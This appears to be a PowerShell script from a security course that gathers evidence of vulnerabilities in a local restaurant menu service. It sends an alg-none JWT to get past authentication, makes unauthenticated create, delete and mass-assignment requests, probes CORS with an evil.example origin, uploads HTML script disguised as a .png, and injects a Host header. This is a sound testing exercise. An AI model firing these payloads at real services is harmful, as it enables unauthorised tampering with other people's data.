# =====================================================================
# evidence-dynamic-menu.ps1
# SE4030 - Black-box (dynamic) reproduction of vulnerabilities in
# menu-service. Targets a TEMP instance, default http://localhost:3101
# (platoo_menu_scan database). Run ONLY against this temp instance.
# Run:  powershell -ExecutionPolicy Bypass -File evidence-dynamic-menu.ps1
# Writes evidence into <repo>/docs/security/evidence/EV-M<n>-*.txt
# NOTE: JSON bodies are written to temp files and sent with
# --data-binary "@file" because PowerShell 5.1 strips inner double-quotes
# when passing inline JSON as an argument to native curl.exe.
# =====================================================================
param(
  [string]$BaseUrl = 'http://localhost:3101'
)
$ErrorActionPreference = 'Stop'
$evid = Join-Path $PSScriptRoot '..\evidence'
if (-not (Test-Path $evid)) { New-Item -ItemType Directory -Path $evid -Force | Out-Null }
$tmp = Join-Path $env:TEMP 'opencode'
if (-not (Test-Path $tmp)) { New-Item -ItemType Directory -Path $tmp -Force | Out-Null }
$stamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'

function New-EvidenceFile {
  param([string]$Name, [string]$Title, [string]$Request)
  $f = Join-Path $evid $Name
  "================================================================" | Set-Content $f
  "$Title  [$stamp]" | Add-Content $f
  "Target: $BaseUrl  (temporary scan instance, dedicated scan DB)" | Add-Content $f
  "================================================================`n" | Add-Content $f
  '---- REQUEST ----' | Add-Content $f
  $Request | Add-Content $f
  '---- RESPONSE ----' | Add-Content $f
  return $f
}

function Send-Json {
  param([string]$Url, [string]$Json, [string]$Method = 'POST', [switch]$GetOnly, [string]$AuthHeader, [string]$HostHeader)
  $bf = Join-Path $tmp ("body-{0}.json" -f ([guid]::NewGuid().ToString('N')))
  Set-Content -Path $bf -Value $Json -NoNewline -Encoding ascii
  $args = @('-s')
  if ($GetOnly) { $args += $Url }
  else {
    $args += @('-X', $Method, $Url, '-H', 'Content-Type: application/json', '--data-binary', "@$bf")
  }
  if ($AuthHeader) { $args += @('-H', $AuthHeader) }
  if ($HostHeader) { $args += @('-H', $HostHeader) }
  & curl.exe @args
}

$jsonRestaurant = '{"owner_id":"owner-vuln","name":"VulnSpot","image":"i.png","rating":3,"deliveryTime":"30m","deliveryFee":"Rs100","minOrder":"Rs300","distance":"1km","cuisines":["x"],"priceLevel":1,"location":{"type":"Point","coordinates":[79.86,6.92],"tag":"a"}}'

# ---- EV-M1 No auth / garbage JWT accepted (broken access control) ----
$f = New-EvidenceFile 'EV-M1-menu-noauth-crud.txt' 'EV-M1 : menu-service CRUD runs with NO/INVALID JWT (missing authentication)' "POST $BaseUrl/api/restaurants with garbage JWT and with no Authorization header"
'--- 1. POST /api/restaurants with a GARBAGE JWT (expired alg-none) ---' | Add-Content $f
Send-Json -Url "$BaseUrl/api/restaurants" -Json $jsonRestaurant -AuthHeader 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJleHAiOjF9.' | Add-Content $f
'--- 2. POST /api/restaurants with NO Authorization header at all ---' | Add-Content $f
Send-Json -Url "$BaseUrl/api/restaurants" -Json $jsonRestaurant | Add-Content $f
'--- 3. DELETE a restaurant with no auth (id taken from response of step 2) ---' | Add-Content $f
$id = (Send-Json -Url "$BaseUrl/api/restaurants" -Json $jsonRestaurant | ConvertFrom-Json)._id
if ($id) { curl.exe -s -o NUL -w 'DELETE HTTP %{http_code}`n' -X DELETE "$BaseUrl/api/restaurants/$id" | Add-Content $f } else { 'could not create restaurant' | Add-Content $f }
'--- 4. PATCH modifies someone else''s record (owner_id overwritten) ---' | Add-Content $f
if ($id) {
  Send-Json -Url "$BaseUrl/api/restaurants/$id" -Json '{"owner_id":"attacker-controlled","is_active":false,"rating":1}' -Method 'PATCH' | Add-Content $f
}
'--- 5. GET /api/restaurants (first 200 chars) ---' | Add-Content $f
$body = (curl.exe -s "$BaseUrl/api/restaurants") -join '' | Out-String
if ($body) { $body.Substring(0, [Math]::Min(200, $body.Length)) | Add-Content $f } else { '[]' | Add-Content $f }
Write-Output "wrote $f"

# ---- EV-M2 Mass assignment (owner_id + is_active via generic PUT) ----
$f = New-EvidenceFile 'EV-M2-menu-mass-assignment.txt' 'EV-M2 : Mass assignment - attacker overwrites owner_id / is_active / price through generic PUT (req.body passed whole)' "PUT $BaseUrl/api/restaurants/<id> body: {owner_id:'attacker-999', is_active:false, rating:1}"
$id2 = (Send-Json -Url "$BaseUrl/api/restaurants" -Json $jsonRestaurant | ConvertFrom-Json)._id
if ($id2) {
  Send-Json -Url "$BaseUrl/api/restaurants/$id2" -Json '{"owner_id":"attacker-999","is_active":false,"rating":1}' -Method 'PUT' | Add-Content $f
  '--- GET shows owner_id now attacker-999 and is_active:false (persisted) ---' | Add-Content $f
  (curl.exe -s "$BaseUrl/api/restaurants/$id2") | Add-Content $f
} else { 'could not create restaurant' | Add-Content $f }
Write-Output "wrote $f"

# ---- EV-M3 Verbose error / invalid ObjectId CastError leak ----
$f = New-EvidenceFile 'EV-M3-menu-verbose-errors.txt' 'EV-M3 : Verbose error handling - CastError + Mongoose validation details leaked' "curl.exe -s $BaseUrl/api/restaurants/not-an-objectid"
curl.exe -s "$BaseUrl/api/restaurants/not-an-objectid" | Add-Content $f
'--- missing-required-field validation leak (menu-item) ---' | Add-Content $f
Send-Json -Url "$BaseUrl/api/menu-items" -Json '{}' | Add-Content $f
Write-Output "wrote $f"

# ---- EV-M4 Security headers / CORS ----
$f = New-EvidenceFile 'EV-M4-menu-headers-cors.txt' 'EV-M4 : Missing security headers + permissive CORS' "curl.exe -s -D - -o NUL -H 'Origin: https://evil.example' $BaseUrl/api/restaurants"
curl.exe -s -D - -o NUL -H 'Origin: https://evil.example' "$BaseUrl/api/restaurants" | Add-Content $f
Write-Output "wrote $f"

# ---- EV-M5 Insecure file upload: HTML file accepted with .png extension ----
$f = New-EvidenceFile 'EV-M5-menu-upload-html-as-png.txt' 'EV-M5 : Insecure file upload - HTML/script content accepted as .png (extension-only filter, no content validation)' "curl.exe -s -X POST $BaseUrl/api/upload -F 'file=@evil.html;type=text/html' (field name per upload.routes.ts: 'file')"
$evilHtml = Join-Path $tmp 'evil.html'
Set-Content -Path $evilHtml -Value '<html><body><script>alert(1)</script>pwned</body></html>' -NoNewline -Encoding ascii
'--- 1. Upload an HTML file named evil.html but with .png extension and image/png mime override ---' | Add-Content $f
$evilPng = Join-Path $tmp 'evil.png'
Copy-Item $evilHtml $evilPng -Force
$up = curl.exe -s -X POST "$BaseUrl/api/upload" -F "file=@$evilPng;type=image/png"
$up | Add-Content $f
'--- 2. Stored file served back under /uploads with original HTML content ---' | Add-Content $f
if ($up -match '"url":"([^"]+)"') {
  $img = $Matches[1]
  curl.exe -s -D - "$img" | Add-Content $f
} else {
  'upload response did not contain a url field' | Add-Content $f
}
'--- 3. Returned URL reflects arbitrary Host header (Host-header injection in response URL) ---' | Add-Content $f
curl.exe -s -X POST "$BaseUrl/api/upload" -H 'Host: evil.example:9999' -F "file=@$evilPng;type=image/png" | Add-Content $f
Write-Output "wrote $f"

Write-Output 'menu dynamic evidence capture complete.'